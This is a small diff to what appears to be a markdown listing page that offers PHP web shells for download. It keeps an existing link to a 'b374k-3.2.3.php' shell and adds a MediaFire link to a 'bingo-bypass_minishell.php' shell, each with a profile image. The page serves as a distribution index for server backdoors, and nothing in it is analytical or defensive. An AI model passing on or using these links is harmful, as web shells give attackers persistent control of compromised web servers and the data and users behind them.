@@ -21,3 +21,6 @@ Date : 10 January 2023
 # <a href="https://beruangsalju.github.io/shell/b374k-3.2.3.php">b374k-3.2.3</a>
 <img src="https://imgur.com/lBzDy31.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/nk719iyy6976ez0/bingo-bypass_minishell.php/file">Bingo bypass</a>
+<img src="https://imgur.com/9sijhP0.png" alt="beruangsalju profile">
+
